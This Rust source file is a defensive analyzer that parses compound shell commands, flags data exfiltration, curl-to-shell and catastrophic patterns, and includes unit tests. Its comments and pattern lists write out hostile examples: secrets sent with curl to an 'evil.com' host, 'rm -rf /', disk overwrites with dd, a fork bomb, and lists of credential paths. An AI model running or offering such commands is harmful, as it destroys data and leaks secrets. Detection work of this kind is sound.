//! Compound shell command security analyzer.
//!
//! Parses compound shell commands (pipes, chains, subshells, redirections),
//! classifies each subcommand by risk level, and detects dangerous
//! combinations such as data exfiltration patterns.
//!
//! Design principle: **false positives are preferable to false negatives**.
//! A blocked safe command is an inconvenience; a permitted exfiltration is
//! a security breach.

use std::fmt;

// ---------------------------------------------------------------------------
// Core types
// ---------------------------------------------------------------------------

/// Full analysis of a shell command string.
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    /// The original command string.
    pub original: String,
    /// Parsed subcommands with classification.
    pub subcommands: Vec<SubCommand>,
    /// Overall risk assessment.
    pub overall_risk: RiskLevel,
    /// Whether execution should be blocked.
    pub blocked: bool,
    /// Human-readable reason for blocking (if blocked).
    pub block_reason: Option<String>,
}

/// A single subcommand extracted from a compound command.
#[derive(Debug, Clone)]
pub struct SubCommand {
    /// The binary/command name.
    pub command: String,
    /// Arguments (including flags).
    pub args: Vec<String>,
    /// Security classification of this subcommand.
    pub classification: CommandClassification,
    /// How this subcommand is connected to the next one.
    pub connector: Option<Connector>,
}

/// Shell operator connecting two subcommands.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Connector {
    /// `|`
    Pipe,
    /// `&&`
    And,
    /// `||`
    Or,
    /// `;`
    Semicolon,
    /// `&`
    Background,
}

/// Classification of a single command by its security implications.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandClassification {
    /// Benign commands: ls, echo, pwd, date, etc.
    Safe,
    /// Commands that destroy or modify data: rm, chmod, kill, etc.
    Destructive,
    /// Commands that can send data to the network: curl, wget, nc, ssh, etc.
    NetworkEgress,
    /// Commands reading sensitive files: cat .env, cat ~/.ssh/*, etc.
    ReadSensitive,
    /// Commands interacting with wallet files or paths.
    WalletAccess,
    /// Unrecognized command -- treat as risky.
    Unknown,
}

/// Overall risk level for the compound command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    /// All subcommands are safe.
    Safe,
    /// Some risky subcommands but no dangerous combinations.
    Caution,
    /// Dangerous combinations (multiple destructive, etc.).
    Dangerous,
    /// Must block -- exfiltration or catastrophic destruction detected.
    Blocked,
}

impl fmt::Display for RiskLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Safe => write!(f, "Safe"),
            Self::Caution => write!(f, "Caution"),
            Self::Dangerous => write!(f, "Dangerous"),
            Self::Blocked => write!(f, "Blocked"),
        }
    }
}

impl fmt::Display for CommandClassification {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Safe => write!(f, "Safe"),
            Self::Destructive => write!(f, "Destructive"),
            Self::NetworkEgress => write!(f, "NetworkEgress"),
            Self::ReadSensitive => write!(f, "ReadSensitive"),
            Self::WalletAccess => write!(f, "WalletAccess"),
            Self::Unknown => write!(f, "Unknown"),
        }
    }
}

impl fmt::Display for Connector {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Pipe => write!(f, "|"),
            Self::And => write!(f, "&&"),
            Self::Or => write!(f, "||"),
            Self::Semicolon => write!(f, ";"),
            Self::Background => write!(f, "&"),
        }
    }
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Analyze a shell command string for security risks.
///
/// Decomposes the command into subcommands, classifies each, and checks for
/// dangerous combinations. Returns a `CommandAnalysis` with the overall risk
/// level and whether the command should be blocked.
pub fn analyze_command(cmd: &str) -> CommandAnalysis {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return CommandAnalysis {
            original: cmd.to_string(),
            subcommands: vec![],
            overall_risk: RiskLevel::Safe,
            blocked: false,
            block_reason: None,
        };
    }

    // Parse into subcommands
    let subcommands = parse_command(trimmed);

    // Recursively classify subshells in arguments
    let mut all_classifications: Vec<CommandClassification> = Vec::new();
    let mut has_subshell_sensitive = false;
    let mut has_subshell_egress = false;

    for sub in &subcommands {
        all_classifications.push(sub.classification);

        // Scan args for subshell content that was recursively parsed
        for arg in &sub.args {
            if let Some(inner) = extract_subshell_content(arg) {
                let inner_analysis = analyze_command(inner);
                for inner_sub in &inner_analysis.subcommands {
                    match inner_sub.classification {
                        CommandClassification::ReadSensitive => has_subshell_sensitive = true,
                        CommandClassification::NetworkEgress => has_subshell_egress = true,
                        _ => {}
                    }
                    all_classifications.push(inner_sub.classification);
                }
            }
        }
    }

    // Determine overall risk and blocking
    let (overall_risk, blocked, block_reason) = assess_risk(
        &subcommands,
        has_subshell_sensitive,
        has_subshell_egress,
        trimmed,
    );

    CommandAnalysis {
        original: cmd.to_string(),
        subcommands,
        overall_risk,
        blocked,
        block_reason,
    }
}

// ---------------------------------------------------------------------------
// Parser
// ---------------------------------------------------------------------------

/// Internal parsed token before classification.
struct RawSubCommand {
    command: String,
    args: Vec<String>,
    connector: Option<Connector>,
}

/// Parse a command string into subcommands, respecting quotes and subshells.
fn parse_command(input: &str) -> Vec<SubCommand> {
    let raw_parts = split_on_operators(input);
    raw_parts
        .into_iter()
        .map(|raw| {
            let classification = classify_command(&raw.command, &raw.args);
            SubCommand {
                command: raw.command,
                args: raw.args,
                connector: raw.connector,
                classification,
            }
        })
        .collect()
}

/// Split a command string on shell operators (|, &&, ||, ;, &),
/// respecting quotes and subshells.
fn split_on_operators(input: &str) -> Vec<RawSubCommand> {
    let mut results: Vec<RawSubCommand> = Vec::new();
    let mut current_tokens: Vec<String> = Vec::new();
    let mut current_token = String::new();

    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    // Track quoting and subshell depth
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut paren_depth: u32 = 0;

    while i < len {
        let ch = chars[i];

        // Handle escape sequences
        if ch == '\\' && i + 1 < len && !in_single_quote {
            current_token.push(ch);
            current_token.push(chars[i + 1]);
            i += 2;
            continue;
        }

        // Toggle single quotes (not inside double quotes)
        if ch == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            current_token.push(ch);
            i += 1;
            continue;
        }

        // Toggle double quotes (not inside single quotes)
        if ch == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            current_token.push(ch);
            i += 1;
            continue;
        }

        // Inside quotes: everything is literal
        if in_single_quote || in_double_quote {
            current_token.push(ch);
            i += 1;
            continue;
        }

        // Track subshell depth: $( and (
        if ch == '$' && i + 1 < len && chars[i + 1] == '(' {
            paren_depth += 1;
            current_token.push(ch);
            current_token.push('(');
            i += 2;
            continue;
        }

        if ch == '(' {
            paren_depth += 1;
            current_token.push(ch);
            i += 1;
            continue;
        }

        if ch == ')' && paren_depth > 0 {
            paren_depth -= 1;
            current_token.push(ch);
            i += 1;
            continue;
        }

        // Backtick subshell
        if ch == '`' {
            current_token.push(ch);
            i += 1;
            // Consume until closing backtick
            while i < len && chars[i] != '`' {
                current_token.push(chars[i]);
                i += 1;
            }
            if i < len {
                current_token.push('`');
                i += 1;
            }
            continue;
        }

        // Inside a subshell: everything is literal
        if paren_depth > 0 {
            current_token.push(ch);
            i += 1;
            continue;
        }

        // Now we are outside quotes and subshells -- check for operators

        // Check && (must come before single &)
        if ch == '&' && i + 1 < len && chars[i + 1] == '&' {
            finish_token(&mut current_token, &mut current_tokens);
            push_subcommand(&mut results, &mut current_tokens, Some(Connector::And));
            i += 2;
            continue;
        }

        // Check ||
        if ch == '|' && i + 1 < len && chars[i + 1] == '|' {
            finish_token(&mut current_token, &mut current_tokens);
            push_subcommand(&mut results, &mut current_tokens, Some(Connector::Or));
            i += 2;
            continue;
        }

        // Check | (pipe)
        if ch == '|' {
            finish_token(&mut current_token, &mut current_tokens);
            push_subcommand(&mut results, &mut current_tokens, Some(Connector::Pipe));
            i += 1;
            continue;
        }

        // Check ;
        if ch == ';' {
            finish_token(&mut current_token, &mut current_tokens);
            push_subcommand(
                &mut results,
                &mut current_tokens,
                Some(Connector::Semicolon),
            );
            i += 1;
            continue;
        }

        // Check & (background) -- single & not followed by another &
        if ch == '&' {
            finish_token(&mut current_token, &mut current_tokens);
            push_subcommand(
                &mut results,
                &mut current_tokens,
                Some(Connector::Background),
            );
            i += 1;
            continue;
        }

        // Whitespace: token boundary
        if ch.is_ascii_whitespace() {
            finish_token(&mut current_token, &mut current_tokens);
            i += 1;
            continue;
        }

        // Redirections: >, >>, <, 2>, 2>> -- treat as part of the current subcommand
        // We consume the redirection operator and the target as args
        if ch == '>' || ch == '<' || (ch == '2' && i + 1 < len && chars[i + 1] == '>') {
            finish_token(&mut current_token, &mut current_tokens);
            let mut redir = String::new();
            if ch == '2' && i + 1 < len && chars[i + 1] == '>' {
                redir.push('2');
                redir.push('>');
                i += 2;
                if i < len && chars[i] == '>' {
                    redir.push('>');
                    i += 1;
                }
            } else {
                redir.push(ch);
                i += 1;
                if ch == '>' && i < len && chars[i] == '>' {
                    redir.push('>');
                    i += 1;
                }
            }
            current_tokens.push(redir);
            // Skip whitespace after redirection
            while i < len && chars[i].is_ascii_whitespace() {
                i += 1;
            }
            // Consume the target
            let mut target = String::new();
            while i < len
                && !chars[i].is_ascii_whitespace()
                && chars[i] != '|'
                && chars[i] != ';'
                && chars[i] != '&'
            {
                target.push(chars[i]);
                i += 1;
            }
            if !target.is_empty() {
                current_tokens.push(target);
            }
            continue;
        }

        // Regular character
        current_token.push(ch);
        i += 1;
    }

    // Flush remaining
    finish_token(&mut current_token, &mut current_tokens);
    push_subcommand(&mut results, &mut current_tokens, None);

    results
}

/// Finish the current token and push it to the tokens list.
fn finish_token(current_token: &mut String, tokens: &mut Vec<String>) {
    if !current_token.is_empty() {
        tokens.push(std::mem::take(current_token));
    }
}

/// Build a RawSubCommand from accumulated tokens and push to results.
fn push_subcommand(
    results: &mut Vec<RawSubCommand>,
    tokens: &mut Vec<String>,
    connector: Option<Connector>,
) {
    if tokens.is_empty() {
        return;
    }
    let command = tokens.remove(0);
    let args = std::mem::take(tokens);
    results.push(RawSubCommand {
        command,
        args,
        connector,
    });
}

/// Extract the inner content of a `$( ... )` or backtick subshell from an argument.
fn extract_subshell_content(arg: &str) -> Option<&str> {
    let trimmed = arg.trim();
    if trimmed.starts_with("$(") && trimmed.ends_with(')') {
        Some(&trimmed[2..trimmed.len() - 1])
    } else if trimmed.starts_with('`') && trimmed.ends_with('`') && trimmed.len() >= 2 {
        Some(&trimmed[1..trimmed.len() - 1])
    } else {
        None
    }
}

// ---------------------------------------------------------------------------
// Classifier
// ---------------------------------------------------------------------------

/// Safe commands that pose no security risk.
const SAFE_COMMANDS: &[&str] = &[
    "ls",
    "echo",
    "pwd",
    "date",
    "whoami",
    "wc",
    "sort",
    "uniq",
    "head",
    "tail",
    "grep",
    "find",
    "diff",
    "tree",
    "mkdir",
    "touch",
    "basename",
    "dirname",
    "env",
    "printenv",
    "uname",
    "hostname",
    "id",
    "tee",
    "true",
    "false",
    "test",
    "[",
    "printf",
    "seq",
    "tr",
    "cut",
    "paste",
    "column",
    "fold",
    "expand",
    "unexpand",
    "rev",
    "nl",
    "yes",
    "cal",
    "which",
    "type",
    "command",
    "file",
    "stat",
    "du",
    "df",
    "free",
    "uptime",
    "realpath",
    "readlink",
    "md5sum",
    "sha256sum",
    "sha1sum",
    "b2sum",
    "cksum",
    "comm",
    "join",
    "tsort",
    "fmt",
    "pr",
    "sleep",
    "nproc",
    "arch",
    "lsb_release",
    "xargs",
];

/// Destructive commands that modify or destroy data.
const DESTRUCTIVE_COMMANDS: &[&str] = &[
    "rm", "rmdir", "mv", "chmod", "chown", "kill", "pkill", "killall", "mkfs", "dd", "truncate",
    "shred", "chattr", "chgrp",
];

/// Commands that can egress data over the network.
const NETWORK_EGRESS_COMMANDS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "ssh", "scp", "rsync", "ftp", "sftp", "telnet", "nmap", "socat",
    "netcat", "dig", "nslookup", "host", "ping",
];

/// Commands that can read file contents.
const READ_COMMANDS: &[&str] = &[
    "cat", "head", "tail", "less", "more", "strings", "xxd", "base64", "od", "hexdump", "tac", "nl",
];

/// Path patterns that indicate sensitive files.
const SENSITIVE_PATTERNS: &[&str] = &[
    ".env",
    ".ssh",
    "id_rsa",
    "id_ed25519",
    "id_dsa",
    "id_ecdsa",
    "credentials",
    "secret",
    "token",
    "password",
    "private",
    "private_key",
    "/etc/shadow",
    "/etc/passwd",
    "wallet",
    ".gnupg",
    ".aws",
    "authorized_keys",
    "known_hosts",
    ".npmrc",
    ".pypirc",
    ".netrc",
    "kubeconfig",
    ".kube/config",
];

/// Classify a command based on its binary name and arguments.
fn classify_command(command: &str, args: &[String]) -> CommandClassification {
    // Strip any leading path from the command name (e.g., /usr/bin/cat -> cat)
    let binary = command.rsplit('/').next().unwrap_or(command).to_lowercase();

    // Check for destructive commands first
    if DESTRUCTIVE_COMMANDS.iter().any(|c| binary == *c) {
        return CommandClassification::Destructive;
    }

    // Check for network egress
    if NETWORK_EGRESS_COMMANDS.iter().any(|c| binary == *c) {
        // Also check if network egress args reference sensitive data
        if args_reference_sensitive_data(args) {
            // This is both egress and sensitive -- we'll detect the combination
            // at the risk assessment level, but classify as NetworkEgress
            return CommandClassification::NetworkEgress;
        }
        return CommandClassification::NetworkEgress;
    }

    // Check for read commands targeting sensitive paths
    if READ_COMMANDS.iter().any(|c| binary == *c) {
        if args_reference_sensitive_path(args) {
            return CommandClassification::ReadSensitive;
        }
        // cat/head/tail with non-sensitive args is Safe
        return CommandClassification::Safe;
    }

    // Check for wallet access
    if binary.contains("wallet") || args.iter().any(|a| a.to_lowercase().contains("wallet")) {
        return CommandClassification::WalletAccess;
    }

    // Check the safe commands list
    if SAFE_COMMANDS.iter().any(|c| binary == *c) {
        // Even safe commands reading sensitive paths should be flagged
        if args_reference_sensitive_path(args) {
            return CommandClassification::ReadSensitive;
        }
        return CommandClassification::Safe;
    }

    // Check if any arg contains a subshell that reads sensitive data
    for arg in args {
        if let Some(inner) = extract_subshell_content(arg) {
            let inner_analysis = analyze_command(inner);
            for sub in &inner_analysis.subcommands {
                if sub.classification == CommandClassification::ReadSensitive {
                    // The parent command contains a sensitive subshell
                    // but the parent command itself might be NetworkEgress
                    // We handle this in risk assessment
                }
            }
        }
    }

    CommandClassification::Unknown
}

/// Check if any argument references a sensitive file path.
fn args_reference_sensitive_path(args: &[String]) -> bool {
    for arg in args {
        let lower = arg.to_lowercase();
        // Skip flags
        if lower.starts_with('-') && !lower.contains('/') && !lower.contains('.') {
            continue;
        }
        for pattern in SENSITIVE_PATTERNS {
            let pat_lower = pattern.to_lowercase();
            if lower.contains(&pat_lower) {
                return true;
            }
        }
        // Check for ~ expansion patterns
        if lower.contains("~/") {
            for pattern in &[".ssh", ".gnupg", ".aws", ".env"] {
                if lower.contains(pattern) {
                    return true;
                }
            }
        }
    }
    false
}

/// Check if network egress args reference sensitive data directly
/// (e.g., `curl -d @.env`, `curl --data-binary @/etc/shadow`).
fn args_reference_sensitive_data(args: &[String]) -> bool {
    let data_flags = [
        "-d",
        "--data",
        "-F",
        "--form",
        "--data-binary",
        "--data-raw",
        "--data-urlencode",
    ];
    let mut i = 0;
    while i < args.len() {
        let arg = &args[i];
        // Check -d @.env style
        for flag in &data_flags {
            if arg == *flag && i + 1 < args.len() {
                let next = &args[i + 1];
                if let Some(path) = next.strip_prefix('@') {
                    if path_is_sensitive(path) {
                        return true;
                    }
                }
            }
            // Also handle -d=@.env
            if let Some(rest) = arg.strip_prefix(&format!("{flag}=")) {
                if let Some(path) = rest.strip_prefix('@') {
                    if path_is_sensitive(path) {
                        return true;
                    }
                }
            }
        }

        // Check if any argument directly references a sensitive path via @
        if let Some(path) = arg.strip_prefix('@') {
            if path_is_sensitive(path) {
                return true;
            }
        }

        // Check for key=@path pattern (e.g., `file=@/home/.ssh/id_rsa`)
        if let Some(at_pos) = arg.find("=@") {
            let path = &arg[at_pos + 2..];
            if path_is_sensitive(path) {
                return true;
            }
        }

        i += 1;
    }
    false
}

/// Check if a file path is sensitive.
fn path_is_sensitive(path: &str) -> bool {
    let lower = path.to_lowercase();
    SENSITIVE_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_lowercase()))
}

/// Strip outer single or double quotes from a string.
fn strip_outer_quotes(s: &str) -> String {
    let trimmed = s.trim();
    let is_quoted = (trimmed.starts_with('\'') && trimmed.ends_with('\''))
        || (trimmed.starts_with('"') && trimmed.ends_with('"'));
    if is_quoted && trimmed.len() >= 2 {
        return trimmed[1..trimmed.len() - 1].to_string();
    }
    trimmed.to_string()
}

// ---------------------------------------------------------------------------
// Risk assessment
// ---------------------------------------------------------------------------

/// Highly destructive patterns that should always be blocked.
/// These are checked against reconstructed (unquoted) subcommands.
const CATASTROPHIC_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf ~/",
    "mkfs.",
    "dd if=/dev/zero of=/dev/",
    "dd if=/dev/random of=/dev/",
    "> /dev/sda",
    "chmod -r 777 /",
];

/// Patterns that are unmistakably malicious regardless of context.
/// These are checked against the raw input string because they have
/// unique syntax that would never appear as legitimate quoted data.
const RAW_CATASTROPHIC_PATTERNS: &[&str] = &[
    ":(){ :|:& };:", // fork bomb
];

/// Assess overall risk from the set of subcommands and their classifications.
fn assess_risk(
    subcommands: &[SubCommand],
    has_subshell_sensitive: bool,
    has_subshell_egress: bool,
    original_cmd: &str,
) -> (RiskLevel, bool, Option<String>) {
    // Check for unmistakably malicious raw patterns (fork bomb, etc.)
    let normalized_raw = original_cmd.trim().to_lowercase();
    for pattern in RAW_CATASTROPHIC_PATTERNS {
        if normalized_raw.contains(&pattern.to_lowercase()) {
            return (
                RiskLevel::Blocked,
                true,
                Some(format!(
                    "Catastrophic command detected: matches pattern '{pattern}'"
                )),
            );
        }
    }

    // Check for catastrophic patterns in each subcommand.
    // We strip outer quotes from each argument to get the actual values,
    // but only check patterns that start with the subcommand's binary name.
    // This prevents `echo 'rm -rf /'` from matching `rm -rf /`.
    for sub in subcommands {
        let binary = sub
            .command
            .rsplit('/')
            .next()
            .unwrap_or(&sub.command)
            .to_lowercase();
        // Reconstruct with unquoted args for matching
        let mut parts = vec![binary.clone()];
        for arg in &sub.args {
            parts.push(strip_outer_quotes(arg).to_lowercase());
        }
        let reconstructed = parts.join(" ");
        for pattern in CATASTROPHIC_PATTERNS {
            let pat_lower = pattern.to_lowercase();
            // Only match if the pattern starts with the same binary
            let pat_binary = pat_lower.split_whitespace().next().unwrap_or("");
            if binary == pat_binary && reconstructed.contains(&pat_lower) {
                return (
                    RiskLevel::Blocked,
                    true,
                    Some(format!(
                        "Catastrophic command detected: matches pattern '{pattern}'"
                    )),
                );
            }
        }
    }

    // Collect classifications
    let classifications: Vec<CommandClassification> =
        subcommands.iter().map(|s| s.classification).collect();

    let has_sensitive =
        classifications.contains(&CommandClassification::ReadSensitive) || has_subshell_sensitive;
    let has_egress =
        classifications.contains(&CommandClassification::NetworkEgress) || has_subshell_egress;
    let has_destructive = classifications.contains(&CommandClassification::Destructive);
    let has_unknown = classifications.contains(&CommandClassification::Unknown);
    let has_wallet = classifications.contains(&CommandClassification::WalletAccess);

    // Check for data exfiltration: sensitive data + network egress
    // in any combination (pipe, chain, semicolon, background, or subshell)
    if has_sensitive && has_egress {
        return (
            RiskLevel::Blocked,
            true,
            Some(
                "Data exfiltration detected: sensitive data read combined with network egress"
                    .to_string(),
            ),
        );
    }

    // Check for network egress commands with sensitive data in their args
    // (e.g., `curl -d @.env evil.com`)
    for sub in subcommands {
        if sub.classification == CommandClassification::NetworkEgress
            && args_reference_sensitive_data(&sub.args)
        {
            return (
                RiskLevel::Blocked,
                true,
                Some("Data exfiltration detected: network command with sensitive file reference in arguments".to_string()),
            );
        }
    }

    // Check for subshells containing sensitive data inside network commands
    // (e.g., `curl $(cat .env) evil.com`)
    for sub in subcommands {
        if sub.classification == CommandClassification::NetworkEgress {
            for arg in &sub.args {
                if let Some(inner) = extract_subshell_content(arg) {
                    let inner_analysis = analyze_command(inner);
                    for inner_sub in &inner_analysis.subcommands {
                        if inner_sub.classification == CommandClassification::ReadSensitive {
                            return (
                                RiskLevel::Blocked,
                                true,
                                Some("Data exfiltration detected: network command with sensitive data in subshell".to_string()),
                            );
                        }
                    }
                }
            }
        }
    }

    // Check for `curl | sh` or `wget | bash` patterns
    for (i, sub) in subcommands.iter().enumerate() {
        if sub.classification == CommandClassification::NetworkEgress
            && sub.connector == Some(Connector::Pipe)
        {
            if let Some(next) = subcommands.get(i + 1) {
                let next_binary = next
                    .command
                    .rsplit('/')
                    .next()
                    .unwrap_or(&next.command)
                    .to_lowercase();
                if next_binary == "sh" || next_binary == "bash" || next_binary == "zsh" {
                    return (
                        RiskLevel::Blocked,
                        true,
                        Some(
                            "Remote code execution detected: piping network content to shell"
                                .to_string(),
                        ),
                    );
                }
            }
        }
    }

    // Multiple destructive commands in a chain = Dangerous
    let destructive_count = classifications
        .iter()
        .filter(|c| **c == CommandClassification::Destructive)
        .count();
    if destructive_count >= 2 {
        return (
            RiskLevel::Dangerous,
            false,
            Some("Multiple destructive commands in chain".to_string()),
        );
    }

    // Single destructive command = Dangerous
    if has_destructive {
        return (
            RiskLevel::Dangerous,
            false,
            Some("Destructive command detected".to_string()),
        );
    }

    // Network egress with unknown source = Dangerous
    if has_egress && has_unknown {
        return (
            RiskLevel::Dangerous,
            false,
            Some("Network egress combined with unknown command".to_string()),
        );
    }

    // Wallet access = Caution
    if has_wallet {
        return (
            RiskLevel::Caution,
            false,
            Some("Wallet access detected".to_string()),
        );
    }

    // Any unknown command = Caution
    if has_unknown {
        return (
            RiskLevel::Caution,
            false,
            Some("Unrecognized command present".to_string()),
        );
    }

    // Network egress alone (no sensitive data) = Caution
    if has_egress {
        return (
            RiskLevel::Caution,
            false,
            Some("Network egress detected".to_string()),
        );
    }

    // Subshell with sensitive data but no egress = Caution
    if has_sensitive && !has_egress {
        return (
            RiskLevel::Caution,
            false,
            Some("Sensitive data read detected".to_string()),
        );
    }

    // All safe
    (RiskLevel::Safe, false, None)
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- Parsing tests ---

    #[test]
    fn test_simple_command() {
        let analysis = analyze_command("ls");
        assert_eq!(analysis.subcommands.len(), 1);
        assert_eq!(analysis.subcommands[0].command, "ls");
        assert_eq!(analysis.overall_risk, RiskLevel::Safe);
        assert!(!analysis.blocked);
    }

    #[test]
    fn test_pipe_split() {
        let analysis = analyze_command("ls | grep foo");
        assert_eq!(analysis.subcommands.len(), 2);
        assert_eq!(analysis.subcommands[0].command, "ls");
        assert_eq!(analysis.subcommands[0].connector, Some(Connector::Pipe));
        assert_eq!(analysis.subcommands[1].command, "grep");
    }

    #[test]
    fn test_and_split() {
        let analysis = analyze_command("echo hello && echo world");
        assert_eq!(analysis.subcommands.len(), 2);
        assert_eq!(analysis.subcommands[0].connector, Some(Connector::And));
    }

    #[test]
    fn test_quoted_pipe_not_split() {
        let analysis = analyze_command("echo 'hello | world'");
        assert_eq!(analysis.subcommands.len(), 1);
        assert_eq!(analysis.subcommands[0].command, "echo");
        assert_eq!(analysis.overall_risk, RiskLevel::Safe);
    }

    #[test]
    fn test_double_quoted_and_not_split() {
        let analysis = analyze_command("echo \"hello && world\"");
        assert_eq!(analysis.subcommands.len(), 1);
        assert_eq!(analysis.subcommands[0].command, "echo");
        assert_eq!(analysis.overall_risk, RiskLevel::Safe);
    }

    #[test]
    fn test_subshell_parsing() {
        let analysis = analyze_command("echo $(cat .env)");
        assert_eq!(analysis.subcommands.len(), 1);
        assert_eq!(analysis.subcommands[0].command, "echo");
        // The subshell contains ReadSensitive, so Caution
        assert!(analysis.overall_risk >= RiskLevel::Caution);
    }

    // --- Classification tests ---

    #[test]
    fn test_safe_commands() {
        for cmd in &["ls", "echo hello", "pwd", "date", "whoami", "wc -l"] {
            let analysis = analyze_command(cmd);
            assert_eq!(
                analysis.overall_risk,
                RiskLevel::Safe,
                "Expected Safe for '{cmd}'"
            );
        }
    }

    #[test]
    fn test_destructive_classified() {
        let analysis = analyze_command("rm -rf /tmp/test");
        assert_eq!(
            analysis.subcommands[0].classification,
            CommandClassification::Destructive
        );
    }

    #[test]
    fn test_network_egress_classified() {
        let analysis = analyze_command("curl http://example.com");
        assert_eq!(
            analysis.subcommands[0].classification,
            CommandClassification::NetworkEgress
        );
    }

    #[test]
    fn test_read_sensitive_classified() {
        let analysis = analyze_command("cat .env");
        assert_eq!(
            analysis.subcommands[0].classification,
            CommandClassification::ReadSensitive
        );
    }

    #[test]
    fn test_cat_nonsensitive_is_safe() {
        let analysis = analyze_command("cat README.md");
        assert_eq!(
            analysis.subcommands[0].classification,
            CommandClassification::Safe
        );
    }
}
